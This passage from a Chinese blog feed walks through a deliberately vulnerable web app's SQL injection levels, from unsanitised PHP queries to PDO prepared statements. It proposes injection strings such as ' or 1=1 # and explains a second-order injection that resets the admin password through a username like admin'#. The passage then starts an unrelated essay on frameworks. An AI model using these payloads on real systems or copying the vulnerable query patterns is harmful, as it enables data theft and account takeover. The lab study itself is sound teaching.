&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 并没有做什么注入防护
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 尝试构造：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; and 1=1;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; and 1=2;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// select first_name, last_name from from users where user_id = &amp;#39;1&amp;#39; or 1=1;
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">mysql_error&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Increase loop count
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysql_close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="medium">Medium&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 换成了Post 这也太普通了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 使用一些网络请求工具照样改，比如BurpSuite，PostMan，curl.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// mysql_real_escape_string 可以对以下字符进行转义
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// \x00, \n, \r, \, &amp;#39;, &amp;#34; 和 \x1a.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 值得注意的是 mysql_real_escape_string 函数所在的MYSQL扩展在
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除。
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 尝试构造:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = 1 or 1=1;
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">mysql_error&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Display values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Increase loop count
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high">High&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SESSION&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 看起来做了返回条目限制
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39; LIMIT 1;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 没什么套路
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;1&amp;#39; or 1=1 # &amp;#39; LIMIT 1;
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Increase loop count
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysql_close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="impossible">impossible&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Check Anti-CSRF token
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">checkToken&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;user_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;session_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="s1">&amp;#39;index.php&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Was a number entered?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Check the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 这是！PDO!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// PDO 是一种PHP中比较先进的面向对象形式的数据库访问技术
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 不过即使是面向对象它还是事务脚本形式的。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 提供了防SQL注入的功能。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">prepare&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// 无法注入
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">bindParam&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;:id&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">PDO&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">PARAM_INT&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">execute&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">fetch&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// Make sure only 1 result is returned
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">rowCount&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;first_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;last_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Generate Anti-CSRF tsoken
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">generateSessionToken&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="extension">Extension&lt;/h2>
&lt;p>&lt;strong>二次注入:&lt;/strong>&lt;/p>
&lt;p>网站有管理员&lt;code>admin&lt;/code>.&lt;/p>
&lt;p>一位恶意用户注册了&lt;code>admin'#&lt;/code>用户.&lt;/p>
&lt;p>恶意用户更新了自己的密码.&lt;/p>
&lt;p>更新SQL:&lt;/p>
&lt;blockquote>
&lt;p>update from users
set password = &amp;lsquo;$password&amp;rsquo;
where
username = &amp;lsquo;$username&amp;rsquo; and password &amp;lsquo;$password&amp;rsquo;&lt;/p>
&lt;/blockquote>
&lt;p>替换为恶意用户写入的数据:&lt;/p>
&lt;blockquote>
&lt;p>update from users
set password = #{password}
where
username = &amp;lsquo;admin&amp;rsquo;#' and password = &amp;lsquo;$password&amp;rsquo;&lt;/p>
&lt;/blockquote>
&lt;p>注意&lt;code>#&lt;/code> 后面的语句被注释掉了, 所以真正被执行的只有.&lt;/p>
&lt;blockquote>
&lt;p>update from users
set password = #{password}
where
username = &amp;lsquo;admin&amp;rsquo;&lt;/p>
&lt;/blockquote>
&lt;p>恶意用户可以无视管理员&lt;code>admin&lt;/code>的密码验证，直接修改密码。&lt;/p></description></item><item><title>The Framework a good design?</title><link>https://sdttttt.github.io/blog/library_and_framework/</link><pubDate>Mon, 06 Apr 2020 23:34:30 +0800</pubDate><guid>https://sdttttt.github.io/blog/library_and_framework/</guid><description>
&lt;p>我第一次听到框架这个概念已经是在大学的时候了，当时我的老师和我提起。
一开始我非常不习惯在我不熟悉的上下文中编写程序的感觉。只能用四个字来形容&lt;code>寸步难行&lt;/code>。&lt;/p>
&lt;p>过了一段时间后，当你熟悉里这个框架提前为你所做的一切的时候，一切只能用四个字来形容&lt;code>素巴拉细&lt;/code>（美妙）。&lt;/p>
&lt;p>后来，我接触了各种形形色色的框架，从PHP到Java.&lt;/p>
&lt;p>最让我惊叹的莫过于SpringBoot, 它几乎为你准备好了你所需要的一切，如果你需要其他的，也能非常容易的引入进来，
任何框架以及库都能和Spring完美的结合在一起。Spring的可扩展性是我见过所有框架中最棒的！（它的核心理念就是IOC），不得不赞叹Spring是应用层的完美产物。（Spring无法被其他语言模仿和Java的&lt;code>万物对象&lt;/code>的理念有很大关系）&lt;/p>
&lt;hr>
&lt;p>曾经的软件工程师没有这样的待遇，他们往往是从头构建起他们的应用。
这使得成为软件工程师这一职业难以企及。&lt;/p>
&lt;p>由于如今软件行业的变化，软件工程师们已经不能仅仅只在底层工作了，应用层的发展也突飞猛进。
各种软件架构的出现应接不暇。&lt;/p>
&lt;p>框架最初是为了解决重复而复杂的工作而诞生出来的产物。
帮助我们不必再写重复的代码，只需要关心业务逻辑。&lt;/p>
&lt;p>框架可以说是为了应用层的软件工程师而设计的。他们往往不会关心更细粒度的工作。他们只追求稳定的应用和企业架构。&lt;/p>
